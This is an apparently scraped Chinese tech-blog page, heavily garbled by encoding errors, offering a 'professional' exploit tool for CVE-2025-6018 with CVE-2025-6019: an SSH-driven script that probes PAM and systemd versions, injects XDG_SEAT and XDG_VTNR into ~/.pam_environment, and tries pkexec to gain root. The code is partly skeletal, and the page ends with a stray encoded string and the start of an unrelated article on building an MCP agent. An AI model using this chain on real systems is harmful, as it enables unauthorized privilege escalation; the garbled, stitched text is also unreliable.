<p>æœ¬é¡¹ç›®æä¾›äº†ä¸€ä¸ªé’ˆå¯¹CVE-2025-6018æ¼æ´çš„ä¸“ä¸šåˆ©ç”¨å·¥å…·ã€‚è¯¥æ¼æ´å­˜åœ¨äºLinux PAMï¼ˆPluggable Authentication Modulesï¼‰çš„<code>pam_env.so</code>æ¨¡å—ä¸­ï¼Œå…è®¸é€šè¿‡<code>~/.pam_environment</code>æ–‡ä»¶æ³¨å…¥ç¯å¢ƒå˜é‡ï¼Œè¿›è€Œé€šè¿‡SystemDä¼šè¯æ“çºµå®ç°æœ¬åœ°æƒé™æå‡ã€‚ç»“åˆCVE-2025-6019æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¿›ä¸€æ­¥è·å¾—å®Œæ•´çš„rootæƒé™ã€‚</p>
<p>è¯¥å·¥å…·é€šè¿‡SSHè¿æ¥åˆ°ç›®æ ‡ä¸»æœºï¼Œè‡ªåŠ¨åŒ–æ‰§è¡Œæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è¿‡ç¨‹ï¼Œæ”¯æŒopenSUSE Leap 15ã€SUSE Linux Enterprise 15ç­‰å¤šä¸ªLinuxå‘è¡Œç‰ˆã€‚</p>
<h2 data-id="heading-1">åŠŸèƒ½ç‰¹æ€§</h2>
<ul>
<li><strong>è‡ªåŠ¨åŒ–æ¼æ´æ£€æµ‹</strong>ï¼šè‡ªåŠ¨æ£€æŸ¥ç›®æ ‡ç³»ç»Ÿä¸ŠPAMçš„ç‰ˆæœ¬ã€é…ç½®æ–‡ä»¶é¡ºåºä»¥åŠç›¸å…³æ¨¡å—çš„å­˜åœ¨æƒ…å†µã€‚</li>
<li><strong>ç‰ˆæœ¬åŒ¹é…éªŒè¯</strong>ï¼šå†…ç½®æ˜“å—æ”»å‡»çš„PAMç‰ˆæœ¬åˆ—è¡¨ï¼ˆ1.3.0 - 1.6.0ï¼‰ï¼Œè¿›è¡Œç²¾ç¡®åŒ¹é…ã€‚</li>
<li><strong>åˆ©ç”¨é“¾æ‰§è¡Œ</strong>ï¼šè‡ªåŠ¨åŒ–å®ç°CVE-2025-6018å’ŒCVE-2025-6019çš„å®Œæ•´æ”»å‡»é“¾ï¼ŒåŒ…æ‹¬ç¯å¢ƒå˜é‡æ³¨å…¥å’Œåç»­æƒé™æå‡ã€‚</li>
<li><strong>è¯¦ç»†æ—¥å¿—è®°å½•</strong>ï¼šå°†æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ï¼ˆåŒ…æ‹¬æ—¶é—´æˆ³ã€çº§åˆ«å’Œä¿¡æ¯ï¼‰è®°å½•åˆ°æ–‡ä»¶å¹¶è¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œä¾¿äºåˆ†æå’Œè°ƒè¯•ã€‚</li>
<li><strong>å‚æ•°åŒ–é…ç½®</strong>ï¼šæ”¯æŒé€šè¿‡å‘½ä»¤è¡Œå‚æ•°çµæ´»æŒ‡å®šç›®æ ‡IPã€ç”¨æˆ·åå’Œå¯†ç ï¼Œæ˜“äºé›†æˆåˆ°è‡ªåŠ¨åŒ–å·¥ä½œæµä¸­ã€‚</li>
<li><strong>ä¸“ä¸šé”™è¯¯å¤„ç†</strong>ï¼šåŒ…å«SSHè¿æ¥ã€å‘½ä»¤æ‰§è¡Œå’Œæ–‡ä»¶æ“ä½œç­‰ç¯èŠ‚çš„å¼‚å¸¸å¤„ç†ï¼Œæé«˜å·¥å…·çš„å¥å£®æ€§ã€‚</li>
</ul>
<h2 data-id="heading-2">å®‰è£…æŒ‡å—</h2>
<h3 data-id="heading-3">ç³»ç»Ÿè¦æ±‚</h3>
<ul>
<li>Python 3.x</li>
<li>æ“ä½œç³»ç»Ÿï¼šæ”¯æŒPythonçš„ä»»æ„æ“ä½œç³»ç»Ÿï¼ˆLinux, macOS, Windowsç­‰ï¼‰ï¼Œç”¨äºä½œä¸ºæ”»å‡»å‘èµ·ç«¯ã€‚</li>
<li>ç›®æ ‡ç³»ç»Ÿï¼šè¿è¡Œæ˜“å—æ”»å‡»ç‰ˆæœ¬ï¼ˆ1.3.0 - 1.6.0ï¼‰PAMçš„Linuxä¸»æœºã€‚</li>
</ul>
<h3 data-id="heading-4">ä¾èµ–å®‰è£…</h3>
<p>æœ¬å·¥å…·æ ¸å¿ƒä¾èµ–ä¸º<code>paramiko</code>åº“ï¼ˆç‰ˆæœ¬éœ€&gt;=2.12.0ï¼‰ç”¨äºå»ºç«‹SSHè¿æ¥ã€‚</p>
<p>ä½¿ç”¨pipå®‰è£…ä¾èµ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install paramiko&gt;=2.12.0
</code></pre>
<h3 data-id="heading-5">è·å–å·¥å…·</h3>
<p>ç›´æ¥ä»æä¾›çš„æºä»£ç æ–‡ä»¶å¼€å§‹ä½¿ç”¨ï¼Œæ— éœ€å…¶ä»–ç¼–è¯‘æˆ–æ„å»ºæ­¥éª¤ã€‚ç¡®ä¿æ‚¨æ‹¥æœ‰<code>cve_2025_6018_professional.py</code>æ–‡ä»¶çš„æ‰§è¡Œæƒé™ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x cve_2025_6018_professional.py
</code></pre>
<h2 data-id="heading-6">ä½¿ç”¨è¯´æ˜</h2>
<h3 data-id="heading-7">åŸºç¡€ä½¿ç”¨</h3>
<p>é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šç›®æ ‡ä¸»æœºä¿¡æ¯å¹¶è¿è¡Œè„šæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python3 cve_2025_6018_professional.py -i 192.168.1.100 -u vulnerable_user -p user_password
</code></pre>
<h3 data-id="heading-8">å‚æ•°è¯¦è§£</h3>
<ul>
<li><code>-i</code> æˆ– <code>--ip</code>: ç›®æ ‡ä¸»æœºçš„IPåœ°å€ï¼ˆå¿…éœ€ï¼‰ã€‚</li>
<li><code>-u</code> æˆ– <code>--username</code>: ç”¨äºç™»å½•ç›®æ ‡ä¸»æœºçš„ç”¨æˆ·åï¼ˆå¿…éœ€ï¼‰ã€‚</li>
<li><code>-p</code> æˆ– <code>--password</code>: å¯¹åº”ç”¨æˆ·çš„å¯†ç ï¼ˆå¿…éœ€ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-9">å·¥ä½œæµç¨‹</h3>
<ol>
<li><strong>åˆå§‹åŒ–ä¸è¿æ¥</strong>ï¼šå·¥å…·åˆå§‹åŒ–æ—¥å¿—å’Œæ¼æ´ç‰ˆæœ¬æ•°æ®ï¼Œå¹¶å°è¯•é€šè¿‡æä¾›çš„å‡­æ®å»ºç«‹åˆ°ç›®æ ‡ä¸»æœºçš„SSHè¿æ¥ã€‚</li>
<li><strong>æ¼æ´è¯„ä¼°</strong>ï¼šåœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä¸€ç³»åˆ—å‘½ä»¤ï¼Œæ£€æŸ¥PAMç‰ˆæœ¬ã€<code>/etc/pam.d/</code>ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶ï¼ˆç‰¹åˆ«æ˜¯<code>sshd</code>ï¼‰ä¸­<code>pam_env.so</code>å’Œ<code>pam_systemd.so</code>æ¨¡å—çš„é¡ºåºï¼Œä»¥åŠSystemDç‰ˆæœ¬ã€‚</li>
<li><strong>æ¡ä»¶åˆ¤æ–­</strong>ï¼šå¦‚æœæ£€æµ‹åˆ°<code>pam_env.so</code>åœ¨<code>pam_systemd.so</code>ä¹‹å‰è¢«è°ƒç”¨ï¼Œå¹¶ä¸”PAMç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œåˆ™åˆ¤å®šå­˜åœ¨æ¼æ´ã€‚</li>
<li><strong>åˆ©ç”¨æ‰§è¡Œ</strong>ï¼šå¦‚æœå­˜åœ¨æ¼æ´ï¼Œå·¥å…·å°†å°è¯•åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»ºæˆ–ä¿®æ”¹<code>~/.pam_environment</code>æ–‡ä»¶ï¼Œæ³¨å…¥<code>XDG_SEAT=seat0</code>å’Œ<code>XDG_VTNR=1</code>ç­‰ç¯å¢ƒå˜é‡ï¼Œä»¥æ¬ºéª—ç³»ç»Ÿå°†å…¶ä¼šè¯è¯†åˆ«ä¸ºæœ¬åœ°æ´»åŠ¨ä¼šè¯ã€‚</li>
<li><strong>æƒé™æå‡</strong>ï¼šåˆ©ç”¨ä¼ªé€ çš„â€œæ´»åŠ¨ç”¨æˆ·â€èº«ä»½ï¼Œç»“åˆPolkitçš„<code>allow_active</code>ç­–ç•¥ï¼Œå°è¯•æ‰§è¡Œéœ€è¦ç‰¹æƒï¼ˆå¦‚æŒ‚è½½æ“ä½œï¼‰çš„å‘½ä»¤ã€‚å¦‚æœç³»ç»Ÿä¸­è¿˜å­˜åœ¨CVE-2025-6019æ¼æ´ï¼ˆæ¶‰åŠudisks2/libblockdevï¼‰ï¼Œåˆ™å¯èƒ½è¿›ä¸€æ­¥åˆ©ç”¨è¯¥æ¼æ´è·å¾—root shellã€‚</li>
</ol>
<h3 data-id="heading-10">å…¸å‹åœºæ™¯</h3>
<p>è¯¥å·¥å…·ä¸»è¦ç”¨äºæ¸—é€æµ‹è¯•äººå‘˜å’Œå®‰å…¨ç ”ç©¶äººå‘˜åœ¨è·å¾—æˆæƒçš„å‰æä¸‹ï¼Œå¯¹å†…éƒ¨Linuxç³»ç»Ÿè¿›è¡Œå®‰å…¨è¯„ä¼°ï¼ŒéªŒè¯ç³»ç»Ÿæ˜¯å¦å—æ­¤CVEå½±å“ä»¥åŠå®é™…é£é™©ç­‰çº§ã€‚ä¹Ÿå¯ç”¨äºCTFï¼ˆCapture The Flagï¼‰ç«èµ›æˆ–å®‰å…¨æ•™å­¦æ¼”ç¤ºæœ¬åœ°æƒé™æå‡æ¼æ´çš„åˆ©ç”¨åŸç†ã€‚</p>
<h2 data-id="heading-11">æ ¸å¿ƒä»£ç </h2>
<p>ä»¥ä¸‹æ˜¯å·¥å…·ä¸­éƒ¨åˆ†æ ¸å¿ƒåŠŸèƒ½çš„ä»£ç å®ç°åŠè¯¦ç»†æ³¨é‡Šï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> paramiko
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-comment"># é…ç½®æ—¥å¿—è®°å½•ç³»ç»Ÿï¼Œå°†æ—¥å¿—åŒæ—¶è¾“å‡ºåˆ°æ–‡ä»¶å’Œæ§åˆ¶å°ï¼Œä¾¿äºè·Ÿè¸ªåˆ©ç”¨è¿‡ç¨‹</span>
logging.basicConfig(
    level=logging.INFO,
    <span class="hljs-built_in">format</span>=<span class="hljs-string">'%(asctime)s [%(levelname)s] %(message)s'</span>,
    datefmt=<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>,
    handlers=[
        logging.FileHandler(<span class="hljs-string">'cve_2025_6018_exploit.log'</span>),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CVEExploit</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># å®šä¹‰å·²çŸ¥æ˜“å—æ”»å‡»çš„PAMç‰ˆæœ¬èŒƒå›´</span>
        self.vulnerable_versions = [
            <span class="hljs-string">"pam-1.3.0"</span>, <span class="hljs-string">"pam-1.3.1"</span>, <span class="hljs-string">"pam-1.4.0"</span>, <span class="hljs-string">"pam-1.5.0"</span>, 
            <span class="hljs-string">"pam-1.5.1"</span>, <span class="hljs-string">"pam-1.5.2"</span>, <span class="hljs-string">"pam-1.5.3"</span>, <span class="hljs-string">"pam-1.6.0"</span>
        ]
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerability</span>(<span class="hljs-params">self, client</span>):
        <span class="hljs-string">"""å¢å¼ºçš„æ¼æ´æ£€æµ‹å‡½æ•°ï¼Œé€šè¿‡SSHå®¢æˆ·ç«¯åœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œå¤šé¡¹æ£€æŸ¥"""</span>
        logger.info(<span class="hljs-string">"Starting vulnerability assessment"</span>)
        
        <span class="hljs-comment"># å®šä¹‰éœ€è¦æ‰§è¡Œçš„æ£€æŸ¥å‘½ä»¤å­—å…¸</span>
        checks = {
            <span class="hljs-string">"pam_version"</span>: <span class="hljs-string">"rpm -q pam || dpkg -l | grep libpam"</span>, <span class="hljs-comment"># æ£€æŸ¥PAMå®‰è£…åŒ…ç‰ˆæœ¬</span>
            <span class="hljs-string">"pam_env"</span>: <span class="hljs-string">"find /etc/pam.d/ -name '*' -exec grep -l 'pam_env' {} \\; 2&gt;/dev/null"</span>, <span class="hljs-comment"># æŸ¥æ‰¾ä½¿ç”¨pam_envçš„PAMé…ç½®</span>
            <span class="hljs-string">"pam_systemd"</span>: <span class="hljs-string">"find /etc/pam.d/ -name '*' -exec grep -l 'pam_systemd' {} \\; 2&gt;/dev/null"</span>, <span class="hljs-comment"># æŸ¥æ‰¾ä½¿ç”¨pam_systemdçš„PAMé…ç½®</span>
            <span class="hljs-string">"systemd_version"</span>: <span class="hljs-string">"systemctl --version | head -1"</span> <span class="hljs-comment"># æ£€æŸ¥SystemDç‰ˆæœ¬</span>
        }

        vulnerable = <span class="hljs-literal">False</span>
        
        <span class="hljs-keyword">for</span> check_name, command <span class="hljs-keyword">in</span> checks.items():
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># é€šè¿‡SSHè¿æ¥æ‰§è¡Œå‘½ä»¤</span>
                stdin, stdout, stderr = client.exec_command(command)
                output = stdout.read().decode(<span class="hljs-string">'utf-8'</span>).strip()
                error = stderr.read().decode(<span class="hljs-string">'utf-8'</span>).strip()
                
                <span class="hljs-keyword">if</span> output:
                    logger.info(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span>: <span class="hljs-subst">{output}</span>"</span>)
                    <span class="hljs-comment"># å…³é”®é€»è¾‘ï¼šæ£€æŸ¥pam_envæ˜¯å¦åœ¨pam_systemdä¹‹å‰è¢«åŠ è½½</span>
                    <span class="hljs-keyword">if</span> check_name == <span class="hljs-string">"pam_env"</span> <span class="hljs-keyword">and</span> <span class="hljs-string">"sshd"</span> <span class="hljs-keyword">in</span> output:
                        <span class="hljs-comment"># è¿™é‡Œéœ€è¦è¿›ä¸€æ­¥åˆ†æ/etc/pam.d/sshdæ–‡ä»¶çš„å…·ä½“è¡Œé¡ºåº</span>
                        <span class="hljs-comment"># ç®€åŒ–ç¤ºä¾‹ï¼šå‡è®¾æ£€æµ‹åˆ°è¯¥æ–‡ä»¶å³è¿›è¡Œä¸‹ä¸€æ­¥è¯¦ç»†æ£€æŸ¥</span>
                        logger.warning(<span class="hljs-string">"pam_env found in sshd config. Checking order..."</span>)
                        <span class="hljs-comment"># å®é™…ä»£ç ä¸­åº”æ·»åŠ è§£ææ–‡ä»¶åˆ¤æ–­é¡ºåºçš„é€»è¾‘</span>
                <span class="hljs-keyword">elif</span> error:
                    logger.debug(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span> error: <span class="hljs-subst">{error}</span>"</span>)
                <span class="hljs-keyword">else</span>:
                    logger.debug(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span>: No output"</span>)
                    
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                logger.error(<span class="hljs-string">f"Failed to execute <span class="hljs-subst">{check_name}</span> check: <span class="hljs-subst">{e}</span>"</span>)
        
        <span class="hljs-comment"># ç‰ˆæœ¬åŒ¹é…é€»è¾‘ï¼ˆç¤ºä¾‹æ¡†æ¶ï¼‰</span>
        <span class="hljs-comment"># å®é™…åº”ä»`pam_version`æ£€æŸ¥çš„è¾“å‡ºä¸­æå–ç‰ˆæœ¬å·ä¸`vulnerable_versions`åˆ—è¡¨å¯¹æ¯”</span>
        logger.info(<span class="hljs-string">"Vulnerability check completed."</span>)
        <span class="hljs-comment"># è¿”å›True/Falseè¡¨ç¤ºæ¼æ´æ˜¯å¦å­˜åœ¨</span>
        <span class="hljs-keyword">return</span> vulnerable
</code></pre>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self, client, username</span>):
        <span class="hljs-string">"""æ‰§è¡Œæ¼æ´åˆ©ç”¨çš„ä¸»è¦å‡½æ•°ï¼Œå°è¯•æ³¨å…¥ç¯å¢ƒå˜é‡å¹¶æå‡æƒé™"""</span>
        logger.info(<span class="hljs-string">f"Attempting exploit for user: <span class="hljs-subst">{username}</span>"</span>)
        
        <span class="hljs-comment"># 1. åˆ›å»ºæˆ–ä¿®æ”¹ ~/.pam_environment æ–‡ä»¶ï¼Œæ³¨å…¥æ¶æ„ç¯å¢ƒå˜é‡</span>
        pam_env_content = <span class="hljs-string">"""
        # Injected by CVE-2025-6018 exploit
        XDG_SEAT=seat0
        XDG_VTNR=1
        # å¯æ·»åŠ å…¶ä»–ç”¨äºæ¬ºéª—ä¼šè¯ç±»å‹çš„å˜é‡
        """</span>
        pam_env_path = <span class="hljs-string">f"/home/<span class="hljs-subst">{username}</span>/.pam_environment"</span>  <span class="hljs-comment"># å‡è®¾ç”¨æˆ·ä¸»ç›®å½•åœ¨/homeä¸‹</span>
        
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># é€šè¿‡SSHå°†å†…å®¹å†™å…¥æ–‡ä»¶</span>
            command = <span class="hljs-string">f"echo '<span class="hljs-subst">{pam_env_content}</span>' &gt; <span class="hljs-subst">{pam_env_path}</span>"</span>
            stdin, stdout, stderr = client.exec_command(command)
            <span class="hljs-comment"># æ£€æŸ¥å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œ</span>
            exit_status = stdout.channel.recv_exit_status()
            <span class="hljs-keyword">if</span> exit_status == <span class="hljs-number">0</span>:
                logger.info(<span class="hljs-string">f"Successfully created/overwritten <span class="hljs-subst">{pam_env_path}</span>"</span>)
            <span class="hljs-keyword">else</span>:
                error = stderr.read().decode()
                logger.error(<span class="hljs-string">f"Failed to write pam_environment: <span class="hljs-subst">{error}</span>"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logger.error(<span class="hljs-string">f"Error during file creation: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            
        <span class="hljs-comment"># 2. è§¦å‘PAMé‡æ–°è¯»å–ç¯å¢ƒå˜é‡ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å»ºç«‹æ–°çš„SSHä¼šè¯æˆ–é‡æ–°ç™»å½•ï¼‰</span>
        <span class="hljs-comment"># æ³¨æ„ï¼šåœ¨å®é™…åˆ©ç”¨ä¸­ï¼Œå¯èƒ½éœ€è¦ç”¨æˆ·æ³¨é”€å¹¶é‡æ–°ç™»å½•ï¼Œæˆ–è€…å·¥å…·éœ€è¦åˆ›å»ºæ–°çš„SSHè¿æ¥æ¥è§¦å‘æ–°ä¼šè¯ã€‚</span>
        logger.warning(<span class="hljs-string">"Environment variable injected. A new login session (e.g., new SSH connection) may be required for the changes to take effect."</span>)
        
        <span class="hljs-comment"># 3. å°è¯•åˆ©ç”¨ä¼ªé€ çš„â€œæ´»åŠ¨ç”¨æˆ·â€èº«ä»½æ‰§è¡Œç‰¹æƒæ“ä½œï¼ˆç¤ºä¾‹ï¼šé€šè¿‡pkexecï¼‰</span>
        <span class="hljs-comment"># è¿™éœ€è¦ç»“åˆCVE-2025-6019æˆ–å…¶å®ƒPolkitç­–ç•¥</span>
        <span class="hljs-comment"># ç¤ºä¾‹å‘½ä»¤ï¼šå°è¯•è¿è¡Œä¸€ä¸ªéœ€è¦`allow_active`æƒé™çš„PolkitåŠ¨ä½œ</span>
        test_command = <span class="hljs-string">"pkexec --user root whoami"</span>  <span class="hljs-comment"># åªæ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå®é™…å‘½ä»¤å–å†³äºç›®æ ‡ç­–ç•¥</span>
        
        <span class="hljs-keyword">try</span>:
            stdin, stdout, stderr = client.exec_command(test_command)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            <span class="hljs-keyword">if</span> output == <span class="hljs-string">"root"</span>:
                logger.critical(<span class="hljs-string">"SUCCESS: Obtained root privileges!"</span>)
                <span class="hljs-comment"># å¯ä»¥åœ¨æ­¤å¤„æä¾›äº¤äº’å¼shellæˆ–æ‰§è¡Œåç»­payload</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">else</span>:
                logger.info(<span class="hljs-string">"Exploit attempted, but root not obtained. Output: %s, Error: %s"</span>, output, error)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logger.error(<span class="hljs-string">f"Failed to execute privilege test: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<p>6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAM1WcosLlSccXIf2HKuEYUi</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è‡ªå·±å†™ä¸€ä¸ªæ™ºèƒ½ä½“-ä½¿ç”¨MCPæœåŠ¡]]></title>    <link>https://juejin.cn/post/7595393113552666639</link>    <guid>https://juejin.cn/post/7595393113552666639</guid>    <pubDate>2026-01-15T08:12:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113552666639" data-draft-id="7539179280716201994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‡ªå·±å†™ä¸€ä¸ªæ™ºèƒ½ä½“-ä½¿ç”¨MCPæœåŠ¡"/> <meta itemprop="keywords" content="Agent,MCP"/> <meta itemprop="datePublished" content="2026-01-15T08:12:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è·¯è¾¹çš„é˜¿ä¸"/> <meta itemprop="url" content="https://juejin.cn/user/1066942081532212"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‡ªå·±å†™ä¸€ä¸ªæ™ºèƒ½ä½“-ä½¿ç”¨MCPæœåŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1066942081532212/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è·¯è¾¹çš„é˜¿ä¸
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:12:26.000Z" title="Thu Jan 15 2026 08:12:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿˜è®°å¾—æˆ‘ä»¬åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabyno.top%2Fposts%2F2024%2F12%2Fwrite-your-own-agent---theory%2F" target="_blank" title="https://babyno.top/posts/2024/12/write-your-own-agent---theory/" ref="nofollow noopener noreferrer">ä¸Šä¸€ç¯‡æ–‡ç« </a>ä¸­èŠè¿‡çš„â€œæ™ºèƒ½ä½“â€ç†è®ºå—ï¼Ÿ</p>
